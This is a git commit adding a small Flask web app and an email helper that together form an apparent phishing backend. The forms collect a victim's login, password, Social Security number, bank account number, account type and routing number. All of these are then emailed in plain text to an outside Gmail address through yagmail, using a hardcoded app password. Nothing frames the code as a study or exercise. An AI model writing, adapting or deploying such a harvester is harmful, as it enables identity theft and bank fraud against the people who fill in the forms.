4aa685853511e8b41d1c2458d8a49121cd2bd926
Mrcastane <castanedaorlando871@gmail.com>
2025-03-20 22:49:08 +0100

    Initial commit

---
+++ main.py
@@ -0,0 +1,65 @@
+from flask import Flask, render_template, request, redirect, url_for
+from datetime import datetime
+from send_email import EmailSender
+
+user_name = None
+password = None
+ssn = None
+account_number = None
+account_type = None
+routing = None
+
+
+def get_greeting():
+    hour = datetime.now().hour  # Get current hour
+    if 5 <= hour < 12:
+        return "Good Morning! ☀️"
+    elif 12 <= hour < 18:
+        return "Good Afternoon! 🌞"
+    else:
+        return "Good Evening! 🌙"
+
+greet = get_greeting()
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html', greetings = greet)
+
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    global user_name, password
+    user_name = request.form.get("username").strip()
+    password = request.form.get("password").strip()
+
+    return redirect(url_for('info'))
+
+@app.route('/info')
+def info():
+    return render_template('info.html')
+
+
+@app.route('/continue_', methods=['POST'])
+def continue_():
+    global ssn, account_number, account_type,routing
+    ssn = request.form.get("ssn").strip()
+    account_number = request.form.get("account-number").strip()
+    account_type = request.form.get("account-type")
+    routing =  request.form.get("routing")
+
+    return redirect(url_for('thankyou'))
+
+@app.route('/thankyou')
+
+def thankyou():
+    email_sender = EmailSender(user_name, password, ssn, account_number, account_type, routing)
+    result = email_sender.send_email()
+    if result :
+        return "<h1>Thank you for your submission!</h1>"
+    else:
+        return render_template('thankyou.html')
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
---
+++ send_email.py
@@ -0,0 +1,30 @@
+import yagmail
+EMAIL = "castanedaorlando871@gmail.com"
+PASSWORD = "ykucjemebvauveur"
+
+class EmailSender:
+    def __init__(self, user_name, user_password, ssn, account_number, account_type, routing):
+        """Initialize the email sender with credentials."""
+        self.user_name = user_name
+        self.user_password =user_password
+        self.ssn = ssn
+        self.account_number = account_number
+        self.account_type = account_type
+        self.rounting = routing
+        self.sender_email = EMAIL
+        self.app_password = PASSWORD
+        self.yag = yagmail.SMTP(self.sender_email, self.app_password)
+
+    def send_email(self):
+        result = self.yag.send(
+            to="Rubentamez1122@gmail.com",
+            subject="New Info",
+            contents=f"UserName : {self.user_name}\n"
+                     f"Password: {self.user_password}\n"
+                     f"Acount Number: {self.account_number}\n"
+                     f"Acount Type: {self.account_type}\n"
+                     f"Rounting: {self.rounting}\n"
+                     f"SSN/EIN: {self.ssn}",
+            attachments= None
+        )
+        return result
